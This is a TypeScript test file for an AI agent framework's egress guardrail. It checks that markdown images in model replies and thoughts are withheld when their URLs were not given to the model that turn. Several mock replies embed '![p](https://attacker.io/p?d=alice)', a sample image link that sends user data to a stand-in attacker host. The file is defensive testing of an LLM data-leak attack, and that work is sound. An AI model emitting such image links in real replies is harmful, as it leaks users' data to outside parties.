/**
 * A reply image is a leak unless the model was given its URL this turn (or
 * Live session): by the system prompt, the user, a tool result or host
 * history, never by its own earlier reply.
 */
import '../fixtures/test-host.ts';
import { z } from 'zod';
import { standardEgressEnforce } from '../../src/guardrails/egress.ts';
import { EGRESS_RULES } from '../../src/guardrails/rules.ts';
import { OMIT_IMAGE } from '../../src/guardrails/thought-guard.ts';
import {
  registerProfile,
  registerTool,
  runSession,
  runTurn,
} from '../../src/kernel/default-scope.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';
import { defineProfile } from '../../src/kernel/registry/profiles.ts';
import type { ModelProvider, TurnEvent, TurnRequest } from '../../src/kernel/types.ts';
import { eventsOf } from '../fixtures/events.ts';
import { MockLiveWebSocket } from '../fixtures/live-socket.ts';
import { geminiModels, HOST_BINDINGS } from '../fixtures/models.ts';

const PHOTO = 'https://news.site/photo.jpg';

registerTool({
  type: 'function',
  name: 'image_lookup',
  description: 'Finds a photo',
  category: 'test',
  access: 'read-only',
  paths: ['*'],
  loadTier: 'T0',
  permission: 'auto',
  input: z.object({ topic: z.string() }),
  output: z.object({ url: z.string() }),
  handler: () => ({ url: PHOTO }),
});

registerProfile(
  defineProfile({
    type: 'text',
    id: 'image_exfil_bot',
    identity: { handle: 'bot', system: 'Brand art lives at https://brand.site/logo.png.' },
    ...geminiModels('gemini35FlashLite'),
    maxSteps: 2,
    tools: { allow: ['image_lookup'] },
    inputs: { text: true },
    outputs: {},
    guardrails: {
      quota: { perDay: 50 },
      egress: { onBlock: 'refuse_to_user', enforce: standardEgressEnforce },
    },
  }),
);

/** Step one looks up a photo, saying `first`; step two replies `reply`. */
function lookupThen(reply: string, first?: string): ModelProvider {
  let call = 0;
  return {
    async *complete() {
      call++;
      if (call === 1) {
        if (first) yield { type: 'text', text: first };
        yield {
          type: 'tool',
          tool: { name: 'image_lookup', arguments: { topic: 'x' }, callId: 'c1' },
        };
        yield { type: 'done', stop: { kind: 'tool' } };
        return;
      }
      yield { type: 'text', text: reply };
    },
  };
}

async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) {
  const events: TurnEvent[] = [];
  for await (const event of runTurn(
    { profile: 'image_exfil_bot', input: { text: 'show me' }, ...request },
    provider,
  )) {
    events.push(event);
  }
  const imageBlocked = eventsOf(events, 'guardrail').some((e) =>
    e.guardrail.hits?.some((hit) => hit.rule === EGRESS_RULES.image),
  );
  return {
    text: eventsOf(events, 'text')
      .map((e) => e.text ?? '')
      .join(''),
    thought: eventsOf(events, 'thought')
      .map((e) => e.text ?? '')
      .join(''),
    imageBlocked,
  };
}

Deno.test('image exfil: an image a tool returned renders', async () => {
  const reply = `Here: ![photo](${PHOTO})`;
  const { text, imageBlocked } = await run(lookupThen(reply));
  assertEquals([imageBlocked, text.includes(reply)], [false, true]);
});

Deno.test('image exfil: images from the system prompt and the user render', async () => {
  const reply = '![logo](https://brand.site/logo.png) ![mine](https://user.site/cat.png)';
  const { imageBlocked } = await run(lookupThen(reply), {
    input: { text: 'use https://user.site/cat.png' },
  });
  assertEquals(imageBlocked, false);
});

Deno.test('image exfil: an image carrying data to a URL nobody gave the model is withheld', async () => {
  const { text, imageBlocked } = await run(lookupThen('![p](https://attacker.io/p?d=alice)'));
  assertEquals([imageBlocked, text.includes('attacker.io')], [true, false]);
});

Deno.test('image exfil: a URL the model wrote itself earlier in the turn is not given to it', async () => {
  const url = 'https://attacker.io/p?d=alice';
  const { text, imageBlocked } = await run(lookupThen(`![p](${url})`, `Looking up ${url} `));
  assertEquals([imageBlocked, text.includes('![p]')], [true, false]);
});

Deno.test('image exfil: a thought loading an unseen image loses it, and the turn goes on', async () => {
  const provider: ModelProvider = {
    async *complete() {
      yield { type: 'thought', text: 'Maybe ![p](https://attacker.io/p?d=alice) helps. ' };
      yield { type: 'thought', text: `Or ![photo](https://brand.site/logo.png).` };
      yield { type: 'text', text: 'Done.' };
    },
  };
  const { text, thought, imageBlocked } = await run(provider);
  assertEquals(
    [imageBlocked, text, thought.includes('attacker.io'), thought.includes(OMIT_IMAGE)],
    [false, 'Done.', false, true],
  );
  assertEquals(thought.includes('![photo](https://brand.site/logo.png)'), true);
});

async function liveReply(
  reply: string,
  thought?: string,
): Promise<{ text: string; thought: string; imageBlocked: boolean }> {
  const profile = defineProfile({
    type: 'live',
    id: 'image_exfil_live',
    identity: { handle: 'live', system: 'hi' },
    models: { gemini31FlashLive: { ...HOST_BINDINGS.gemini31FlashLive, key: 'slotA' } },
    live: { voice: 'Aoede', ingress: { text: true } },
    tools: { allow: ['image_lookup'] },
    guardrails: { egress: { onBlock: 'refuse_to_user', enforce: standardEgressEnforce } },
  });
  registerProfile(profile);
  let mock: MockLiveWebSocket | undefined;
  const session = await runSession(
    { profile: profile.id },
    {
      vault: { slotA: 'test-key' },
      openWebSocket: () => {
        const socket = new MockLiveWebSocket();
        mock = socket;
        setTimeout(() => socket.open(), 0);
        return Promise.resolve(socket as unknown as WebSocket);
      },
    },
  );
  const live = mock as MockLiveWebSocket;
  const events: TurnEvent[] = [];
  const drain = (async () => {
    for await (const event of session.events()) events.push(event);
  })();
  const until = async (done: () => boolean) => {
    for (let i = 0; i < 50 && !done(); i++) await new Promise((r) => setTimeout(r, 0));
  };
  live.deliver({
    toolCall: { functionCalls: [{ id: 'c1', name: 'image_lookup', args: { topic: 'x' } }] },
  });
  await until(() => events.some((e) => e.type === 'tool'));
  await session.executeTool({ callId: 'c1' });
  if (thought)
    live.deliver({ serverContent: { modelTurn: { parts: [{ text: thought, thought: true }] } } });
  live.deliver({ serverContent: { modelTurn: { parts: [{ text: reply }] } } });
  live.deliver({ serverContent: { outputTranscription: { text: `said ${reply}` } } });
  live.deliver({ serverContent: { turnComplete: true } });
  await until(() => events.some((e) => e.type === 'done'));
  live.close();
  await session.close();
  await drain.catch(() => undefined);
  return {
    text: eventsOf(events, 'text')
      .map((e) => e.text ?? '')
      .join(''),
    thought: eventsOf(events, 'thought')
      .map((e) => e.text ?? '')
      .join(''),
    imageBlocked: eventsOf(events, 'guardrail').some((e) =>
      e.guardrail.hits?.some((hit) => hit.rule === EGRESS_RULES.image),
    ),
  };
}

Deno.test('image exfil: a Live reply and its transcript render an image a tool returned, and withhold one nobody gave', async () => {
  const shown = await liveReply(`![photo](${PHOTO})`);
  assertEquals([shown.imageBlocked, shown.text.includes(PHOTO)], [false, true]);
  const leaked = await liveReply('![p](https://attacker.io/p?d=alice)');
  assertEquals([leaked.imageBlocked, leaked.text.includes('attacker.io')], [true, false]);
});

Deno.test('image exfil: a Live thought loading an unseen image loses it, and the reply goes on', async () => {
  const shown = await liveReply('All set.', 'Try ![p](https://attacker.io/p?d=alice) first. ');
  assertEquals(
    [shown.imageBlocked, shown.text.includes('All set.'), shown.thought.includes('attacker.io')],
    [false, true, false],
  );
  assertEquals(shown.thought.includes(OMIT_IMAGE), true);
});
